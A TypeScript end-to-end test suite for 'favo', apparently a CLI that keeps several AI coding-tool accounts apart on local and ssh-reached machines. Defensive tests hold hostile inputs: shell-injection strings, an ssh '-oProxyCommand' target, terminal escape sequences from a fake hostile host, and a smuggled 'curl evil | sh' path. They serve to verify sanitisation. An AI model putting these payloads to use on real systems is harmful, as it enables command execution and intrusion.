import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  realpathSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { arch, platform, tmpdir } from 'node:os';
import { delimiter } from 'node:path';
import { FavoVersion } from '@favo/contracts/version';
import { installFakes } from './support/fake-bin/install-fakes';

const Main = `${import.meta.dir}/../src/main.ts`;
const isWindows = process.platform === 'win32';
const RemoteFavo = `#!/bin/bash\nexec bun ${Main} "$@"\n`;
const HostileFavo = `#!/bin/sh\nexec bun "${import.meta.dir}/support/fake-bin/hostile-favo.ts" "$@"\n`;

let root: string;
let home: string;
let remoteHome: string;
let fakeBin: string;

async function favo(args: string[], extraEnv: Record<string, string> = {}, cwd?: string) {
  const child = Bun.spawn(['bun', Main, ...args], {
    cwd,
    env: {
      PATH: `${fakeBin}${delimiter}${process.env.PATH}`,
      HOME: home,
      FAVO_HOSTNAME: 'test-mac',
      FAKE_SSH_LOG: `${root}/ssh.log`,
      FAKE_REMOTE_HOME: remoteHome,
      NO_COLOR: '1',
      ...extraEnv,
    },
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
  });
  const [stdout, stderr, code] = await Promise.all([
    new Response(child.stdout).text(),
    new Response(child.stderr).text(),
    child.exited,
  ]);
  return { stdout, stderr, code };
}

beforeEach(() => {
  root = mkdtempSync(`${tmpdir()}/favo-e2e-`).replaceAll('\\', '/');
  fakeBin = `${root}/bin`;
  mkdirSync(fakeBin);
  installFakes(fakeBin);
  home = `${root}/home`;
  remoteHome = `${root}/remote`;
  mkdirSync(`${home}/.claude/skills`, { recursive: true });
  writeFileSync(`${home}/.claude/CLAUDE.md`, 'be kind');
  writeFileSync(`${home}/.claude/settings.json`, '{}');
  writeFileSync(`${home}/.claude/identity`, 'personal@bee.dev');
  mkdirSync(remoteHome, { recursive: true });
});

afterEach(() => rmSync(root, { recursive: true, force: true }));

describe('favo usage', () => {
  it('reads a real conversation with the provider and prints what is left', async () => {
    const { stdout, code } = await favo(['usage']);
    expect(code).toBe(0);
    expect(stdout).toContain('Claude Code');
    expect(stdout).toContain('68% left');
    expect(stdout).toMatch(/personal +[█│╱░]+ +↻ 44m/);
  });
  it('reads the subscription even with an API key around', async () => {
    const { stdout } = await favo(['usage'], { ANTHROPIC_API_KEY: 'sk-test', CLAUDE_CODE_ENTRYPOINT: 'cli' });
    expect(stdout).toContain('68% left');
    expect(stdout).not.toContain('no subscription limits');
  });
  it('starts each read in an empty folder, whatever folder favo runs from', async () => {
    mkdirSync(`${root}/project`);
    writeFileSync(`${root}/project/settings.json`, '{}');
    const { stdout } = await favo(['usage'], {}, `${root}/project`);
    expect(stdout).toContain('68% left');
  });
  it('reads a seat that lives in a cell, from its own folder', async () => {
    await favo(['add', 'work']);
    const path = (await favo(['path', 'work', 'claude'])).stdout.trim();
    writeFileSync(`${path}/identity`, 'work@bee.dev');
    const { stdout } = await favo(['usage']);
    expect(stdout).toContain('Session');
    expect(stdout).toMatch(/work +[█│╱░]+ +68%/);
  });
  it('reads Codex from its app server', async () => {
    mkdirSync(`${home}/.codex`, { recursive: true });
    writeFileSync(`${home}/.codex/identity`, 'bee@hive.dev');
    const { stdout } = await favo(['usage']);
    expect(stdout).toContain('Codex');
    expect(stdout).toContain('90% left');
  });
  it('gives machine readable output', async () => {
    const { stdout } = await favo(['usage', '--json']);
    const [{ machine, seats }] = JSON.parse(stdout);
    expect(machine.id).toBe('local');
    expect(seats[0].usage.windows[0]).toMatchObject({ id: 'five_hour', usedPercent: 32 });
  });
});

describe('favo on this machine', () => {
  it('adds an account, links the shared walls and keeps the login sealed', async () => {
    expect((await favo(['add', 'work'])).code).toBe(0);
    const path = (await favo(['path', 'work', 'claude'])).stdout.trim();
    expect(path.replaceAll('\\', '/')).toBe(`${home}/.favo/accounts/work/claude`);
    expect(readFileSync(`${path}/CLAUDE.md`, 'utf8')).toBe('be kind');
    expect(lstatSync(`${path}/skills`).isSymbolicLink()).toBe(true);
    expect(existsSync(`${path}/identity`)).toBe(false);
  });
  it('runs the provider as the account, with its arguments, and returns its exit code', async () => {
    await favo(['add', 'work']);
    const result = await favo(['claude', 'work', '--', '--resume', 'abc']);
    expect(result.stdout).toContain(`home=${home}/.favo/accounts/work/claude`);
    expect(result.stdout).toContain('args=--resume abc');
    expect(result.code).toBe(3);
  });
  it('starts the provider in the folder you asked for', async () => {
    mkdirSync(`${root}/project`);
    const { stdout } = await favo(['claude', '--dir', `${root}/project`]);
    expect(realpathSync(/cwd=(\S+)/.exec(stdout)![1]!).replaceAll('\\', '/')).toBe(
      realpathSync(`${root}/project`).replaceAll('\\', '/')
    );
  });
  it('refuses a folder that is not there', async () => {
    const result = await favo(['claude', '--dir', `${root}/nothing`]);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('No folder at');
  });
  it('runs personal with the provider own folder and no isolation', async () => {
    expect((await favo(['claude'])).stdout).toContain(`home=${home}/.claude`);
  });
  it('keeps two accounts signed in at once', async () => {
    await favo(['add', 'work']);
    await favo(['login', 'work', 'claude']);
    const { stdout } = await favo(['list']);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('signed-in@bee.dev');
  });
  it('reads Codex identity through the app server of each account', async () => {
    await favo(['add', 'work']);
    const path = (await favo(['path', 'work', 'codex'])).stdout.trim();
    writeFileSync(`${path}/identity`, 'codex@bee.dev');
    expect((await favo(['list'])).stdout).toContain('codex@bee.dev · plus');
  });
  it('gives Antigravity a private home that still has the git identity', async () => {
    writeFileSync(`${home}/.gitconfig`, '[user] name = bee');
    await favo(['add', 'work']);
    const { stdout } = await favo(['agy', 'work']);
    expect(stdout).toContain(`home=${home}/.favo/accounts/work/antigravity`);
    expect(stdout).toContain('gitconfig=[user] name = bee');
  });
  it('runs OpenCode standalone with its own data', async () => {
    await favo(['add', 'work']);
    const { stdout } = await favo(['opencode', 'work']);
    expect(stdout).toContain(`data=${home}/.favo/accounts/work/opencode`);
    expect(stdout).toContain('args=--standalone');
  });
  it('heals a link at launch, without a schedule', async () => {
    await favo(['add', 'work']);
    await favo(['path', 'work', 'claude']);
    mkdirSync(`${home}/.claude/commands`);
    await favo(['claude', 'work']);
    expect(lstatSync(`${home}/.favo/accounts/work/claude/commands`).isSymbolicLink()).toBe(true);
  });
  it('applies the tmux fix only inside tmux', async () => {
    const inside = await favo(['claude'], { TMUX: '/tmp/tmux', TERM: 'tmux-ghostty' });
    expect(inside.stdout).toContain('tmux=none term=xterm-256color');
    const outside = await favo(['claude'], { TERM: 'xterm-ghostty' });
    expect(outside.stdout).toContain('term=xterm-ghostty');
  });
  it('reads launch arguments from the config', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    writeFileSync(
      `${home}/.favo/config.json`,
      JSON.stringify({ providers: { claude: { launchArgs: ['--dangerously-skip-permissions'] } } })
    );
    expect((await favo(['claude'])).stdout).toContain('args=--dangerously-skip-permissions');
  });
  it('moves a removed account to the trash', async () => {
    await favo(['add', 'work']);
    const { stdout } = await favo(['rm', 'work']);
    expect(stdout.replaceAll('\\', '/')).toContain(`${home}/.favo/trash/work-`);
    expect(stdout).toContain('until you delete that folder');
    expect(existsSync(`${home}/.favo/accounts/work`)).toBe(false);
  });
  it('adopts an old config folder', async () => {
    mkdirSync(`${home}/.claude-work/projects`, { recursive: true });
    writeFileSync(`${home}/.claude-work/projects/thread.jsonl`, 'hello');
    expect((await favo(['adopt', 'work', 'claude', '~/.claude-work'])).code).toBe(0);
    expect(readFileSync(`${home}/.favo/accounts/work/claude/projects/thread.jsonl`, 'utf8')).toBe('hello');
    expect(readFileSync(`${home}/.favo/accounts/work/claude/CLAUDE.md`, 'utf8')).toBe('be kind');
  });
  it('never moves the base, however it is spelled', async () => {
    mkdirSync(`${home}/hop`);
    symlinkSync(home, `${home}/hop/back`, 'junction');
    const spellings = ['~/.claude', '.claude', './.claude/', 'hop/../.claude', 'hop/back/.claude', home];
    for (const from of spellings) {
      const result = await favo(['adopt', 'work', 'claude', from], {}, home);
      expect({ from, code: result.code }).toEqual({ from, code: 1 });
      expect(result.stderr).toContain('favo never moves');
    }
    expect(readFileSync(`${home}/.claude/CLAUDE.md`, 'utf8')).toBe('be kind');
    expect(existsSync(`${home}/.favo/accounts/work`)).toBe(false);
  });
  it('never takes the seat of another account', async () => {
    await favo(['add', 'other']);
    await favo(['path', 'other', 'claude']);
    const result = await favo(['adopt', 'work', 'claude', '~/.favo/accounts/other/claude']);
    expect(result.stderr).toContain('favo never moves');
    expect(existsSync(`${home}/.favo/accounts/other/claude`)).toBe(true);
  });
  it('never writes through a link in an adopted folder', async () => {
    mkdirSync(`${home}/.gemini`);
    writeFileSync(`${home}/.gemini/GEMINI.md`, 'be kind');
    mkdirSync(`${root}/outside`);
    mkdirSync(`${home}/old-seat`);
    symlinkSync(`${root}/outside`, `${home}/old-seat/.gemini`, 'junction');
    await favo(['adopt', 'work', 'agy', '~/old-seat']);
    expect(readdirSync(`${root}/outside`)).toEqual([]);
  });
  it('lists and removes an account named like an inherited property', async () => {
    expect((await favo(['add', 'constructor'])).code).toBe(0);
    expect((await favo(['list'])).stdout).toContain('  constructor');
    expect((await favo(['rm', 'constructor'])).code).toBe(0);
  });
  it('saves a theme and reads a custom one from disk', async () => {
    mkdirSync(`${home}/.favo/themes`, { recursive: true });
    writeFileSync(`${home}/.favo/themes/mine.json`, JSON.stringify({ name: 'Mine', colors: { accent: '#112233' } }));
    expect((await favo(['theme', 'mine'])).code).toBe(0);
    expect(JSON.parse(readFileSync(`${home}/.favo/config.json`, 'utf8')).theme).toBe('mine');
    expect((await favo(['theme'])).stdout).toContain('▸ mine');
  });
  it('still runs providers when the config is broken for themes but not for launch', async () => {
    mkdirSync(`${home}/.favo/themes`, { recursive: true });
    writeFileSync(`${home}/.favo/themes/bad.json`, '{ nope');
    expect((await favo(['claude'])).stdout).toContain(`home=${home}/.claude`);
  });
  it('reports a friendly error and exit code', async () => {
    const result = await favo(['login', 'ghost', 'claude']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('favo: No account named "ghost".');
  });
});

describe.skipIf(isWindows)('favo with another machine', () => {
  function installAsset() {
    const system = platform() === 'darwin' ? 'darwin' : 'linux';
    mkdirSync(`${home}/.favo/assets/${FavoVersion}`, { recursive: true });
    writeFileSync(`${home}/.favo/assets/${FavoVersion}/favo-${system}-${arch()}`, RemoteFavo);
  }

  async function joinRemote() {
    installAsset();
    mkdirSync(`${remoteHome}/.claude`, { recursive: true });
    writeFileSync(`${remoteHome}/.claude/CLAUDE.md`, 'remote walls');
    writeFileSync(`${remoteHome}/.claude/identity`, 'remote@bee.dev');
    return favo(['machine', 'add', 'bee@remote']);
  }

  it('installs itself over ssh and answers from the other side', async () => {
    const added = await joinRemote();
    expect(added.stdout).toContain(`favo ${FavoVersion} is running on remote`);
    expect(existsSync(`${remoteHome}/.favo/bin/favo`)).toBe(true);
    const { stdout } = await favo(['machine', 'list', '--json']);
    const machines = JSON.parse(stdout);
    expect(machines[1]).toMatchObject({ id: 'remote', state: 'online', hostname: 'fake-remote' });
  });
  it('reads usage on the other machine, over the same pipe', async () => {
    await joinRemote();
    const { stdout } = await favo(['usage', '--machine', 'remote']);
    expect(stdout).toContain('68% left');
  });
  it('shows both machines in one list', async () => {
    await joinRemote();
    const { stdout } = await favo(['list']);
    expect(stdout).toContain('test-mac this machine · online');
    expect(stdout).toContain('remote bee@remote · online');
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('remote@bee.dev');
  });
  it('creates an account over there, with links over there', async () => {
    await joinRemote();
    await favo(['add', 'side', '-m', 'remote']);
    const path = (await favo(['path', 'side', 'claude', '-m', 'remote'])).stdout.trim();
    expect(path).toBe(`${remoteHome}/.favo/accounts/side/claude`);
    expect(readlinkSync(`${path}/CLAUDE.md`)).toBe(`${remoteHome}/.claude/CLAUDE.md`);
    expect(existsSync(`${home}/.favo/accounts/side`)).toBe(false);
  });
  it('starts in a folder on the other machine, and checks it there', async () => {
    await joinRemote();
    mkdirSync(`${remoteHome}/my project`);
    const { stdout } = await favo(['claude', '-m', 'remote', '--dir', `${remoteHome}/my project`]);
    expect(stdout).toContain('/my project');
    const missing = await favo(['claude', '-m', 'remote', '--dir', `${remoteHome}/nothing`]);
    expect(missing.stderr).toContain('No folder at');
  });
  it('launches over ssh with a real terminal', async () => {
    await joinRemote();
    await favo(['add', 'side', '-m', 'remote']);
    const { stdout } = await favo(['claude', 'side', '-m', 'remote', '--', 'hi there']);
    expect(stdout).toContain(`home=${remoteHome}/.favo/accounts/side/claude`);
    expect(stdout).toContain('args=hi there');
    expect(readFileSync(`${root}/ssh.log`, 'utf8')).toMatch(
      /-t -- bee@remote ~\/\.favo\/bin\/favo --argv-b64 [A-Za-z0-9_-]+\n/
    );
  });
  it('carries any argument across a real shell, and that shell runs none of it', async () => {
    await joinRemote();
    await favo(['add', 'side', '-m', 'remote']);
    const prompt = `a" & touch one & "b $(touch two) \`touch three\` %PATH% it's \\'; touch four; echo '`;
    const { stdout } = await favo(['claude', 'side', '-m', 'remote', '--', '-p', prompt]);
    expect(stdout).toContain(`args=-p ${prompt}`);
    for (const name of ['one', 'two', 'three', 'four']) expect(existsSync(`${remoteHome}/${name}`)).toBe(false);
  });
  it('keeps the favo home to its owner, on both machines', async () => {
    await joinRemote();
    await favo(['list']);
    expect(statSync(`${home}/.favo`).mode & 0o777).toBe(0o700);
    expect(statSync(`${remoteHome}/.favo`).mode & 0o777).toBe(0o700);
  });
  it('closes a favo home that was left open', async () => {
    mkdirSync(`${home}/.favo`);
    chmodSync(`${home}/.favo`, 0o755);
    await favo(['--version']);
    expect(statSync(`${home}/.favo`).mode & 0o777).toBe(0o700);
  });
  it('refuses a machine it cannot reach and remembers nothing', async () => {
    installAsset();
    const result = await favo(['machine', 'add', 'down@host']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('Connection refused');
    expect((await favo(['machine', 'list', '--json'])).stdout).not.toContain('down');
  });
  it('sees a machine that has no favo yet', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const machines = { machines: [{ id: 'remote', name: 'remote', target: 'bee@remote', isLocal: false }] };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify(machines));
    const { stdout } = await favo(['machine', 'list']);
    expect(stdout).toContain('needsInstall');
  });
  it('never hands a stored target to ssh as an option', async () => {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const stored = { id: 'evil', name: 'evil', target: '-oProxyCommand=touch pwned', isLocal: false };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify({ machines: [stored] }));
    const result = await favo(['list']);
    expect(result.code).toBe(1);
    expect(result.stderr).toContain('The target of "evil"');
    expect(existsSync(`${root}/ssh.log`)).toBe(false);
  });
});

describe.skipIf(isWindows)('favo with a hostile machine', () => {
  function installHostile() {
    mkdirSync(`${home}/.favo`, { recursive: true });
    const machines = { machines: [{ id: 'evil', name: 'evil', target: 'bee@evil', isLocal: false, system: 'posix' }] };
    writeFileSync(`${home}/.favo/machines.json`, JSON.stringify(machines));
    mkdirSync(`${remoteHome}/.favo/bin`, { recursive: true });
    writeFileSync(`${remoteHome}/.favo/bin/favo`, HostileFavo);
    chmodSync(`${remoteHome}/.favo/bin/favo`, 0o755);
  }

  function hasControlCharacter(text: string) {
    return /\p{Cc}/u.test(text.replaceAll('\n', ''));
  }

  it('prints nothing a terminal would obey', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'escapes' });
    expect(code).toBe(0);
    expect(stdout).toContain('evil bee@evil · online · /srv]0;pwned]52;c;Y3VybA==[2J31m');
    expect(stdout).toContain('boss]0;pwned');
    expect(hasControlCharacter(stdout)).toBe(false);
  });
  it('cannot put a command on its own line in a path you would paste', async () => {
    installHostile();
    const { stdout } = await favo(['list', '--json'], { FAKE_HOSTILE: 'escapes' });
    const [, evil] = JSON.parse(stdout);
    expect(evil.accounts[0].seats[0].path).toBe('/h/.claudecurl evil | sh');
  });
  it('cannot reach the terminal through an error', async () => {
    installHostile();
    const { stderr, code } = await favo(['add', 'side', '-m', 'evil'], { FAKE_HOSTILE: 'error' });
    expect(code).toBe(1);
    expect(stderr).toContain('favo: ]0;pwned');
    expect(hasControlCharacter(stderr)).toBe(false);
  });
  it('shows a reply favo cannot read on that machine, and lists the others', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'bad-reply' });
    expect(code).toBe(0);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('evil sent a reply favo could not read.');
  });
  it('gives up on a line that never ends, and lists the others', async () => {
    installHostile();
    const { stdout, code } = await favo(['list'], { FAKE_HOSTILE: 'flood' });
    expect(code).toBe(0);
    expect(stdout).toContain('personal@bee.dev');
    expect(stdout).toContain('evil bee@evil · offline');
  });
});
